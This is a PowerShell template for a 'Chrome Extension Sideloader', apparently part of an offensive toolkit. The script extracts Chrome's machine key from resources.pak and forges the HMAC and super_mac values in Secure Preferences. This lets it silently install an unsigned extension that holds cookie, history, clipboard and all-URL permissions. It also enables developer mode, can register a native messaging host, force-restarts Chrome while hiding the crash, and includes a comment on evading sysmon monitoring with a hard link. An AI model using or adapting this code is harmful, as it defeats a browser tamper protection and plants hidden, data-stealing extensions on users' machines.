# PowerShell script template

param(
    [string]$ExtensionInstallDir = "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\myextension",
    [string]$ExtensionDescription = "Chrome Extension",
    [string]$InstallNativeMessagingHost = "false",
    [string]$ForceRestartChrome = "true"
)

# ChromePathHelper functions
function Get-ChromeApplicationPath {
    $programFiles = [Environment]::ExpandEnvironmentVariables("%ProgramW6432%")
    $programFilesX86 = [Environment]::ExpandEnvironmentVariables("%ProgramFiles(x86)%")
    
    $basePath = $null
    if (Test-Path "$programFiles\Google\Chrome\Application") {
        $basePath = "$programFiles\Google\Chrome\Application"
    }
    else {
        $basePath = "$programFilesX86\Google\Chrome\Application"
    }
    
    $subdirectories = Get-ChildItem -Path $basePath -Directory
    $finalSubDir = ""
    
    foreach ($subdir in $subdirectories) {
        if ($subdir.Name.Split('.').Length -gt 2) {
            $finalSubDir = $subdir.FullName
        }
    }
    
    if ([string]::IsNullOrEmpty($finalSubDir)) {
        throw "Cannot find Google Chrome App directory."
    }
    
    return $finalSubDir
}

function Is-Windows11 {
    $osName = (Get-CimInstance Win32_OperatingSystem).Caption
    if ($osName -like "*Windows 11*") {
        return $true
    } 
    return $false
}

function Get-PreferencesPath {
    $appLocalData = [Environment]::ExpandEnvironmentVariables("%localappdata%")
    return "$appLocalData\Google\Chrome\User Data\Default\Preferences"
}

function Get-SecurePreferencesPath {
    $appLocalData = [Environment]::ExpandEnvironmentVariables("%localappdata%")
    return "$appLocalData\Google\Chrome\User Data\Default\Secure Preferences"
}

# ChromeMachineId functions
function Get-DeviceId {
    return ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -split '-')[0..6] -join '-'
}

function Get-MachineKey {
    param([string]$ResourcePath = $null)
    
    if (-not $ResourcePath) {
        $chromePath = Get-ChromeApplicationPath
        $ResourcePath = "$chromePath\resources.pak"
    }
    
    if (-not (Test-Path $ResourcePath)) {
        throw "Resources.pak file not found at: $ResourcePath"
    }
    
    try {
        $resourceBytes = [System.IO.File]::ReadAllBytes($ResourcePath)
        
        $version = [System.BitConverter]::ToInt32($resourceBytes, 0)
        $encoding = [System.BitConverter]::ToInt32($resourceBytes, 4)
        $resourceCount = [System.BitConverter]::ToUInt16($resourceBytes, 8)
        $aliasCount = [System.BitConverter]::ToUInt16($resourceBytes, 10)
        
        $resourceOffset = 12 + $resourceCount * 6 + $aliasCount * 6
        $lastResourceOffset = $resourceOffset
        
        for ($i = 1; $i -lt $resourceCount; $i++) {
            $resourceId = [System.BitConverter]::ToUInt16($resourceBytes, 12 + $i * 6)
            $fileOffset = [System.BitConverter]::ToUInt16($resourceBytes, 12 + $i * 6 + 2)
            
            if ($fileOffset - $lastResourceOffset -eq 64) {
                $machineKey = $resourceBytes[$lastResourceOffset..($lastResourceOffset + 63)]
                return $machineKey
            }
            else {
                $lastResourceOffset = $fileOffset
            }
        }
        
        throw "PAK does not have a 64 byte resource"
    }
    catch {
        throw "Failed to extract machine key: $($_.Exception.Message)"
    }
}

# ExtensionCryptoHelpers functions
function Get-Sha256HashForBytes {
    param([byte[]]$BytesToHash)
    
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $sha256.ComputeHash($BytesToHash)
    $sha256.Dispose()
    
    $builder = [System.Text.StringBuilder]::new()
    foreach ($b in $hashBytes) {
        $builder.Append($b.ToString("x2"))
    }
    
    return $builder.ToString()
}

function ConvertTo-JsonWithEscaping {
    param(
        [Parameter(ValueFromPipeline=$true)]
        $InputObject,
        [switch]$Compress,
        [int]$Depth = 100
    )
        
    $result = $InputObject | ConvertTo-Json -Compress:$Compress -Depth $Depth
    # ConvertTo-Json adds double backslashes, so we need to remove them
    $result = $result.Replace('\\\\','\\')
    return $result
}


function ConvertTo-JsonSorted {
    
    param(
        [Parameter(ValueFromPipeline=$true)]
        $InputObject,
        [switch]$Compress,
        [int]$Depth = 100
    )
    
    function Sort-ObjectRecursively {
        param($obj)
        
        if ($obj -is [array]) {
            # For arrays, preserve order but recursively sort any objects within
            $sortedArray = @()
            foreach ($item in $obj) {
                $sortedArray += Sort-ObjectRecursively $item
            }
            return $sortedArray
        }
        elseif ($obj -is [PSCustomObject]) {
            # For PSCustomObjects, sort keys and recursively sort values
            $sortedObj = [PSCustomObject]@{}
            $sortedKeys = $obj.PSObject.Properties.Name | Sort-Object
            
            foreach ($key in $sortedKeys) {
                $value = $obj.$key                        
                $sortedValue = Sort-ObjectRecursively $value
                $sortedObj | Add-Member -MemberType NoteProperty -Name $key -Value $sortedValue
            }
            return $sortedObj
        }
        elseif ($obj -is [hashtable]) {
            # For hashtables, convert to PSCustomObject first, then sort
            $sortedObj = [PSCustomObject]@{}
            $sortedKeys = $obj.Keys | Sort-Object
            
            foreach ($key in $sortedKeys) {
                $value = $obj[$key]                
                $sortedValue = Sort-ObjectRecursively $value
                $sortedObj | Add-Member -MemberType NoteProperty -Name $key -Value $sortedValue
            }
            return $sortedObj
        }
        else {
            # For primitive values, return as-is
            return $obj
        }
    }
    
    try {
        # Recursively sort all object keys while preserving array order
        $sortedObject = Sort-ObjectRecursively $InputObject
        
        # Convert to JSON with array preservation
        if ($sortedObject -is [array]) {
            # Handle top-level arrays specially to prevent flattening
            $arrayElements = @()
            foreach ($element in $sortedObject) {
                # Force conversion to PSCustomObject if needed before JSON conversion
                if ($element -is [hashtable]) {
                    $element = [PSCustomObject]$element
                }
                $arrayElements += ($element | ConvertTo-JsonWithEscaping -Compress:$Compress -Depth $Depth)
            }
            return "[$($arrayElements -join ',')]"
        } else {
            # Force conversion to PSCustomObject if needed before JSON conversion
            if ($sortedObject -is [hashtable]) {
                $sortedObject = [PSCustomObject]$sortedObject
            }
            return $sortedObject | ConvertTo-JsonWithEscaping -Compress:$Compress -Depth $Depth
        }
    }
    catch {
        # If sorting fails, fall back to regular ConvertTo-Json
        return $InputObject | ConvertTo-JsonWithEscaping -Compress:$Compress -Depth $Depth
    }
}

function Convert-StringToByteArray {
    param(
        [string]$Hex
    )
    
    $bytes = @()
    for ($i = 0; $i -lt $Hex.Length; $i += 2) {
        $bytes += [System.Convert]::ToByte($Hex.Substring($i, 2), 16)
    }
    return $bytes
}

function Calculate-ExtensionIdFromPath {
    param(
        [string]$Path
    )
    
    $unicodeBytes = [System.Text.Encoding]::Unicode.GetBytes($Path)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $hashBytes = $sha256.ComputeHash($unicodeBytes)
    $sha256.Dispose()
    
    $hexString = ""
    foreach ($b in $hashBytes) {
        $hexString += $b.ToString("x2")
    }
    
    $extensionId = ""
    for ($i = 0; $i -lt 32; $i++) {
        $hexChar = $hexString[$i]
        $hexVal = [System.Convert]::ToInt32($hexChar.ToString(), 16)
        $extensionId += [char]($hexVal + 97)
    }
    
    return $extensionId
}

function ConvertTo-DeepPSCustomObject {
    param($InputObject)
    
    if ($InputObject -is [hashtable]) {
        $result = [PSCustomObject]@{}
        foreach ($key in $InputObject.Keys) {
            $result | Add-Member -MemberType NoteProperty -Name $key -Value (ConvertTo-DeepPSCustomObject -InputObject $InputObject[$key])
        }
        return $result
    }
    elseif ($InputObject -is [PSCustomObject]) {
        $result = [PSCustomObject]@{}
        foreach ($prop in $InputObject.PSObject.Properties) {
            $result | Add-Member -MemberType NoteProperty -Name $prop.Name -Value (ConvertTo-DeepPSCustomObject -InputObject $prop.Value)
        }
        return $result
    }
    elseif ($InputObject -is [array]) {
        $result = @()
        foreach ($item in $InputObject) {
            $result += ConvertTo-DeepPSCustomObject -InputObject $item
        }
        return $result
    }
    else {
        return $InputObject
    }
}

function Sort-AndCullJson {
    param(
        [string]$JsonString
    )
    
    function Remove-EmptyJsonValues {
        param([string]$JsonString)
        
        # Remove empty objects: {}
        $JsonString = $JsonString -replace ',"[^"]*":\{\}', ''
        $JsonString = $JsonString -replace '\{"[^"]*":\{\},?', '{'
        $JsonString = $JsonString -replace ',\{\}', ''
        
        # Remove empty arrays: []
        $JsonString = $JsonString -replace ',"[^"]*":\[\]', ''
        $JsonString = $JsonString -replace '\{"[^"]*":\[\],?', '{'
        $JsonString = $JsonString -replace ',\[\]', ''
        
        # Remove empty strings: ""
        $JsonString = $JsonString -replace ',"[^"]*":""', ''
        $JsonString = $JsonString -replace '\{"[^"]*":"",?', '{'
        $JsonString = $JsonString -replace ',""', ''
        
        # Remove null values
        $JsonString = $JsonString -replace ',"[^"]*":null', ''
        $JsonString = $JsonString -replace '\{"[^"]*":null,?', '{'
        $JsonString = $JsonString -replace ',null', ''
        
        # Clean up trailing commas
        $JsonString = $JsonString -replace ',\}', '}'
        $JsonString = $JsonString -replace ',\]', ']'
        
        return $JsonString
    }
    
    function Sort-TopLevelJsonKeys {
        param([string]$JsonString)
        
        # Parse as object to get proper structure, then manually rebuild with sorted keys
        # This is used for HMAC generation, so it works with the culled JSON string
        try {
            $obj = $JsonString | ConvertFrom-Json
            
            # Get all property names and sort them
            $sortedKeys = $obj.PSObject.Properties.Name | Sort-Object
            
            # Rebuild JSON with sorted keys but preserve nested structure
            $sortedPairs = @()
            foreach ($key in $sortedKeys) {
                $value = $obj.$key
                
                # Handle arrays specially to prevent flattening
                if ($value -is [array]) {
                    # Convert array elements individually and wrap in brackets
                    $arrayElements = @()
                    foreach ($element in $value) {
                        $arrayElements += ($element | ConvertTo-JsonWithEscaping -Compress -Depth 100)
                    }
                    $valueJson = "[$($arrayElements -join ',')]"
                } else {
                    # For certain problematic objects, use ConvertTo-JsonSorted instead
                    if ($key -eq "account_values") {
                        # Deep convert to ensure all nested objects are PSCustomObjects
                        $cleanValue = ConvertTo-DeepPSCustomObject -InputObject $value
                        $valueJson = $cleanValue | ConvertTo-JsonSorted -Compress
                    } else {
                        $valueJson = $value | ConvertTo-JsonWithEscaping -Compress -Depth 100
                    }
                }
                
                $sortedPairs += "`"$key`":$valueJson"
            }
            
            return "{$($sortedPairs -join ',')}"
        }
        catch {
            # If parsing fails, return original
            return $JsonString
        }
    }
    
    $cleanedJson = Remove-EmptyJsonValues -JsonString $JsonString
    $jsonResult = Sort-TopLevelJsonKeys -JsonString $cleanedJson
    
    # Convert Unicode escape sequences back to ASCII characters
    $jsonResult = $jsonResult -replace '\\u003C', '<'
    $jsonResult = $jsonResult -replace '\\u003E', '>'
    
    # We need to escape the < character back to this very specific encoding to perfectly match Chrome's hashing
    $jsonResult = $jsonResult.Replace('<', '\u003C')

    return $jsonResult
}

function Calc-HMACFromString {
    param(
        [string]$String,
        [string]$JsonPath,
        [byte[]]$Key,
        [string]$DeviceId
    )
    
    $deviceIdBytes = [System.Text.Encoding]::UTF8.GetBytes($DeviceId)
    $jsonPathBytes = [System.Text.Encoding]::UTF8.GetBytes($JsonPath)
    $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($String)
    $msg = $deviceIdBytes + $jsonPathBytes + $contentBytes
    
    $hmac = [System.Security.Cryptography.HMACSHA256]::new($Key)
    $computedHash = $hmac.ComputeHash($msg)
    $hmac.Dispose()
    $hexString = [System.BitConverter]::ToString($computedHash).Replace("-", "").ToUpper()
    return $hexString
}

function Calc-HMACFromJson {   
    param(
        [string]$JsonContent,
        [string]$JsonPath,
        [byte[]]$Key,
        [string]$DeviceId
    )
    
    if ([string]::IsNullOrEmpty($JsonContent)) {
        throw "JsonContent cannot be null or empty"
    }
    
    # Normalize the JSON by removing all empty objects + arrays and alphabetizing content
    $fixedContent = Sort-AndCullJson -JsonString $JsonContent
    
    if ([string]::IsNullOrEmpty($fixedContent)) {
        throw "Sort-AndCullJson returned null or empty content"
    }
       
    # Build the message: deviceId + path + content
    $deviceIdBytes = [System.Text.Encoding]::UTF8.GetBytes($DeviceId)
    $jsonPathBytes = [System.Text.Encoding]::UTF8.GetBytes($JsonPath)
    $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($fixedContent)

    $msg = $deviceIdBytes + $jsonPathBytes + $contentBytes


    # $keyHex = [System.BitConverter]::ToString($Key).Replace("-", "").ToLower()
    #Write-Host "Key: $keyHex"
    # Write-Host "Calculating HMAC for message:"
    # $valHex = [System.BitConverter]::ToString($msg).Replace("-", "").ToLower()
    #Write-Host "Message Length: $($msg.Length)"
    # $msgString = [System.Text.Encoding]::UTF8.GetString($msg)
    # Write-Host "Message: $msgString"
    # $msgHex = [System.BitConverter]::ToString($msg).Replace("-", "").ToLower()
    #Write-Host "MessageHex: $msgHex"

    # Calculate HMAC-SHA256
    $hmac = [System.Security.Cryptography.HMACSHA256]::new($Key)

    $computedHash = $hmac.ComputeHash($msg)
    $hmac.Dispose()
    
    $hexString = [System.BitConverter]::ToString($computedHash).Replace("-", "").ToUpper()
    return $hexString
}

# ExtensionSideloader functions
function Get-SuperMacFromSecurePrefJson {
    param([string]$SecurePrefJson)
    
    $securePrefObj = $SecurePrefJson | ConvertFrom-Json
    return $securePrefObj.protection.super_mac
}

function Set-SuperMacForSecurePrefJson {
    param([string]$SecurePrefJson, [string]$NewSuperMac)
    
    $securePrefObj = $SecurePrefJson | ConvertFrom-Json
    $securePrefObj.protection.super_mac = $NewSuperMac
    return $securePrefObj | ConvertTo-JsonSorted -Compress
}

function Add-ExtensionToSecurePrefJson {
    param(
        [string]$SecurePref,
        [string]$JsonToAdd,
        [string]$InstallPath,
        [string]$DeviceId,
        [byte[]]$Key
    )
    
    Write-Host "Adding Extension for install path $InstallPath"
    
    $addedExtension = $JsonToAdd | ConvertFrom-Json
    $addedExtension | Add-Member -MemberType NoteProperty -Name "path" -Value $InstallPath -Force
    $extensionWithPath = ConvertTo-Json $addedExtension -Compress -Depth 100

    Write-Host "Extension with path value: $extensionWithPath"

    Write-Host "Setting Path in extensionJSON to $InstallPath"
    
    Write-Host "Parsing Existing Preferences Object"
    $securePrefObj = $SecurePref | ConvertFrom-Json
    
    # Robustly ensure extensions and settings exist and are objects
    if (-not $securePrefObj.PSObject.Properties['extensions']) {
        $securePrefObj | Add-Member -MemberType NoteProperty -Name "extensions" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.extensions -or $securePrefObj.extensions -isnot [object]) {
        $securePrefObj.extensions = [PSCustomObject]@{}
    }
    
    if (-not $securePrefObj.extensions.PSObject.Properties['settings']) {
        $securePrefObj.extensions | Add-Member -MemberType NoteProperty -Name "settings" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.extensions.settings -or $securePrefObj.extensions.settings -isnot [object]) {
        $securePrefObj.extensions.settings = [PSCustomObject]@{}
    }
    
    $extensionSettingsListObj = $securePrefObj.extensions.settings
        
    if ($null -eq $extensionSettingsListObj) {
        Write-Host "Error: extensionSettingsListObj is null, creating new object" -ForegroundColor Red
        $extensionSettingsListObj = [PSCustomObject]@{}
        $securePrefObj.extensions.settings = $extensionSettingsListObj
    }
    
    $calculatedId = Calculate-ExtensionIdFromPath -Path $InstallPath
    Write-Host "CalculatedID of $calculatedId"
    $extensionSettingsListObj | Add-Member -MemberType NoteProperty -Name "$calculatedId" -Value $addedExtension -Force
    
    Write-Host "Calculating extension.settings HMAC"
    $path = "extensions.settings.$calculatedId"
    $calculatedExtensionMac = Calc-HMACFromJson -JsonContent $extensionWithPath -JsonPath $path -Key $Key -DeviceId $DeviceId
    Write-Host "HMAC is calculated to be $calculatedExtensionMac"
    
    # Robustly ensure nested properties exist and are objects
    if (-not $securePrefObj.PSObject.Properties['protection']) {
        $securePrefObj | Add-Member -MemberType NoteProperty -Name "protection" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.protection -or $securePrefObj.protection -is [string] -or ($securePrefObj.protection -isnot [PSCustomObject] -and $securePrefObj.protection -isnot [hashtable])) {
        $securePrefObj.protection = [PSCustomObject]@{}
    }

    if (-not $securePrefObj.protection.PSObject.Properties['macs']) {
        $securePrefObj.protection | Add-Member -MemberType NoteProperty -Name "macs" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.protection.macs -or $securePrefObj.protection.macs -is [string] -or ($securePrefObj.protection.macs -isnot [PSCustomObject] -and $securePrefObj.protection.macs -isnot [hashtable])) {
        $securePrefObj.protection.macs = [PSCustomObject]@{}
    }

    # Create super_mac object if it doesn't exist so we can set it
    if (-not $securePrefObj.protection.PSObject.Properties['super_mac']) {
        $securePrefObj.protection | Add-Member -MemberType NoteProperty -Name "super_mac" -Value ([PSCustomObject]@{}) -Force
    }     
    
    if (-not $securePrefObj.protection.macs.PSObject.Properties['extensions']) {
        $securePrefObj.protection.macs | Add-Member -MemberType NoteProperty -Name "extensions" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.protection.macs.extensions -or $securePrefObj.protection.macs.extensions -is [string] -or ($securePrefObj.protection.macs.extensions -isnot [PSCustomObject] -and $securePrefObj.protection.macs.extensions -isnot [hashtable])) {
        $securePrefObj.protection.macs.extensions = [PSCustomObject]@{}
    }
    
    if (-not $securePrefObj.protection.macs.extensions.PSObject.Properties['settings']) {
        $securePrefObj.protection.macs.extensions | Add-Member -MemberType NoteProperty -Name "settings" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.protection.macs.extensions.settings -or $securePrefObj.protection.macs.extensions.settings -is [string] -or ($securePrefObj.protection.macs.extensions.settings -isnot [PSCustomObject] -and $securePrefObj.protection.macs.extensions.settings -isnot [hashtable])) {
        $securePrefObj.protection.macs.extensions.settings = [PSCustomObject]@{}
    }
    
    $extensionsListObj = $securePrefObj.protection.macs.extensions.settings

    # Set extensions.ui.developer_mode to true - create the objects if they don't exist
    if (-not $securePrefObj.extensions.PSObject.Properties['ui']) {
        $securePrefObj.extensions | Add-Member -MemberType NoteProperty -Name "ui" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.extensions.ui -or $securePrefObj.extensions.ui -is [string] -or ($securePrefObj.extensions.ui -isnot [PSCustomObject] -and $securePrefObj.extensions.ui -isnot [hashtable])) {
        $securePrefObj.extensions.ui = [PSCustomObject]@{}
    }

    # Set extensions.ui.developer_mode to true - create the objects if they don't exist
    if (-not $securePrefObj.extensions.ui.PSObject.Properties['developer_mode']) {
        $securePrefObj.extensions.ui | Add-Member -MemberType NoteProperty -Name "developer_mode" -Value ([PSCustomObject]@{}) -Force
    } 

    $securePrefObj.extensions.ui.developer_mode = $true
    $path = "extensions.ui.developer_mode"
    $calculatedDeveloperModeMac = Calc-HMACFromString -String "true" -JsonPath $path -Key $Key -DeviceId $DeviceId
    
    # Ensure protection.macs.extensions.ui exists before setting developer_mode
    if (-not $securePrefObj.protection.macs.extensions.PSObject.Properties['ui']) {
        $securePrefObj.protection.macs.extensions | Add-Member -MemberType NoteProperty -Name "ui" -Value ([PSCustomObject]@{}) -Force
    } elseif ($null -eq $securePrefObj.protection.macs.extensions.ui -or $securePrefObj.protection.macs.extensions.ui -is [string] -or ($securePrefObj.protection.macs.extensions.ui -isnot [PSCustomObject] -and $securePrefObj.protection.macs.extensions.ui -isnot [hashtable])) {
        $securePrefObj.protection.macs.extensions.ui = [PSCustomObject]@{}
    }
    
    # Use Add-Member to safely add the developer_mode property
    $securePrefObj.protection.macs.extensions.ui | Add-Member -MemberType NoteProperty -Name "developer_mode" -Value $calculatedDeveloperModeMac -Force
        
    if ($null -eq $extensionsListObj) {
        Write-Host "Error: extensionsListObj is null, creating new object" -ForegroundColor Red
        $extensionsListObj = [PSCustomObject]@{}
        $securePrefObj.protection.macs.extensions.settings = $extensionsListObj
    }

    $extensionsListObj | Add-Member -MemberType NoteProperty -Name "$calculatedId" -Value $calculatedExtensionMac -Force
    Write-Host "Updated protection.macs.extensions.settings"            
    return $securePrefObj
}

# Install-NativeMessagingHost function
function Install-NativeMessagingHost {
    param(
        [string]$ExtensionPath,
        [string]$NativeAppPath,
        [string]$ExtensionRegName,
        [string]$ExtensionDescription
    )
    
    $nativeMessagingConfigPath = "$ExtensionPath\$ExtensionRegName.json"
    $linkedExtensionId = Calculate-ExtensionIdFromPath -Path $ExtensionPath
    
    $configContent = @"
{
  "name": "$ExtensionRegName",
  "description": "$ExtensionDescription",
  "path": "$($NativeAppPath.Replace('\', '\\'))",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://$linkedExtensionId/"]
}
"@
    
    $configContent | Out-File -FilePath $nativeMessagingConfigPath -Encoding UTF8
    
    $regPath = "HKCU:\Software\Google\Chrome\NativeMessagingHosts\$ExtensionRegName"
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "(Default)" -Value $nativeMessagingConfigPath -PropertyType String -Force | Out-Null
    
    # Check if 32-bit registry path exists before creating the key
    $regPath32Parent = "HKCU:\Software\Wow6432Node\Google\Chrome\NativeMessagingHosts"
    if (Test-Path $regPath32Parent) {
        try {
            $regPath32 = "$regPath32Parent\$ExtensionRegName"
            New-Item -Path $regPath32 -Force | Out-Null
            New-ItemProperty -Path $regPath32 -Name "(Default)" -Value $nativeMessagingConfigPath -PropertyType String -Force | Out-Null
            Write-Host "Successfully created 32-bit registry entry"
        }
        catch {
            Write-Host "Failed to set 32-bit registry key: $($_.Exception.Message)"
        }
    }
    else {
        Write-Host "32-bit Chrome registry path not found (this is normal if 32-bit Chrome is not installed)"
    }
}

$ExtensionSettings = '{"account_extension_type":0,"active_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"commands":{},"content_settings":[],"creation_flags":38,"disable_reasons":[],"first_install_time":"13397690747955841","from_webstore":false,"granted_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13397690747955841","location":4,"newAllowFileAccess":true,"preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

function Main {
    try {
        Write-Host "Starting Chrome Extension Sideloader..." -ForegroundColor Green
        
        
        # Get Chrome paths and machine information
        $securePrefFilePrefPath = Get-SecurePreferencesPath
        $preferencesPath = Get-PreferencesPath

        $deviceId = Get-DeviceId
        $key = Get-MachineKey
        $existingSecurePref = Get-Content -Path $securePrefFilePrefPath -Raw -Encoding UTF8
        $existingPreferences = Get-Content -Path $preferencesPath -Raw -Encoding UTF8

        # Windows 11 by default just stores content in Preferences versus Secure Preferences, so update it there
        if (Is-Windows11){
            $existingSecurePref = $existingPreferences
            $securePrefFilePrefPath = $preferencesPath
        }
        
        Write-Host "Device ID: $deviceId" -ForegroundColor Yellow
        Write-Host "Secure Preferences Path: $securePrefFilePrefPath" -ForegroundColor Yellow
        
        # Install extension
        $extensionInstallPath = [Environment]::ExpandEnvironmentVariables($ExtensionInstallDir)
        Write-Host "Installing extension to: $extensionInstallPath" -ForegroundColor Cyan
        
        # Extract embedded extension content
        Extract-EmbeddedExtension -ExtensionPath $extensionInstallPath
        
        $modifiedPrefFileObj = Add-ExtensionToSecurePrefJson -SecurePref $existingSecurePref -JsonToAdd $ExtensionSettings -InstallPath $extensionInstallPath -DeviceId $deviceId -Key $key
        
        $macsObj = $modifiedPrefFileObj.protection.macs
        $calculatedSuperMac = Calc-HMACFromJson -JsonContent ($macsObj | ConvertTo-JsonSorted -Compress) -JsonPath "" -Key $key -DeviceId $deviceId
        Write-Host "Calculated SuperMAC as $calculatedSuperMac"
        
        $modifiedPrefFileObj.protection.super_mac = $calculatedSuperMac

        Write-Host "Updating SuperMAC in Secure Preferences"
        
        # As a potential evasion measure, we could create a hard link to Preferences and write to that instead:
        # New-Item -ItemType HardLink -Path .\WhateverAliasWeWant -Target .\Preferences
        # $stuffToWrite | Out-File -FilePath .\WhateverAliasWeWant -Encoding UTF8 <- This will avoid sysmon file monitoring for writes to Preferences
        $modifiedPrefFileObj | ConvertTo-Json -Compress -Depth 100 | Out-File -FilePath $securePrefFilePrefPath -Encoding UTF8
        Write-Host "Secure Preferences file updated successfully!" -ForegroundColor Green

        # Install native messaging host if specified
        if ($InstallNativeMessagingHost -eq "true") {
            $hostPath = $extensionInstallPath + "\NativeAppHost.exe"
            Write-Host "Installing native messaging host to: $hostPath" -ForegroundColor Cyan
                    
            $extensionName = Split-Path $ExtensionInstallDir -Leaf
            $lowerCaseExtensionName = $extensionName.ToLower()
            Install-NativeMessagingHost -ExtensionPath $extensionInstallPath -NativeAppPath $hostPath -ExtensionRegName $lowerCaseExtensionName -ExtensionDescription $ExtensionDescription
        }
                
        # Force restart Chrome if specified
        if ($ForceRestartChrome -eq "true") {
            Write-Host "Force restarting Chrome..." -ForegroundColor Yellow
            
            $chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
            if ($chromeProcesses) {
                Write-Host "Terminating Chrome processes..." -ForegroundColor Yellow
                $chromeProcesses | Stop-Process -Force
                
                while (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
                    Start-Sleep -Milliseconds 10
                }
            }
            
            $userPreferencePath = $preferencesPath
            if (Test-Path $userPreferencePath) {
                $userPreferenceContent = Get-Content -Path $userPreferencePath -Raw -Encoding UTF8
                $userPreferenceContent = $userPreferenceContent.Replace('"exit_type":"Crashed"', '"exit_type":"none"')
                $userPreferenceContent | Out-File -FilePath $userPreferencePath -Encoding UTF8
                Write-Host "Updated Chrome preferences to remove crash flag" -ForegroundColor Yellow
            }
            
            $chromePath = (Get-ChromeApplicationPath) + "\..\chrome.exe"
            if (Test-Path $chromePath) {
                Start-Process -FilePath $chromePath -ArgumentList "--restore-last-session"
                Write-Host "Chrome restarted with session restore" -ForegroundColor Green
            }
            else {
                Write-Host "Chrome executable not found at: $chromePath" -ForegroundColor Red
            }
        }
        
        Write-Host "Chrome Extension Sideloader completed successfully!" -ForegroundColor Green
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor Red
        exit 1
    }
}

# These functions will be replaced by the Python builder with actual extraction logic
function Extract-EmbeddedExtension {
    param([string]$ExtensionPath)
    # This will be replaced by the Python builder
    throw "Extract-EmbeddedExtension function not implemented - this should be replaced by the Python builder"
}

# Run the main function only if this script is being executed directly (not dot-sourced)
if ($MyInvocation.InvocationName -ne '.') {
    Write-Host "Starting Chrome Extension Sideloader..." -ForegroundColor Green
    Write-Host "Running Main function" -ForegroundColor Green
    Main
} else {
    Write-Host "Script was dot-sourced, functions are now available but Main() was not called" -ForegroundColor Yellow
}
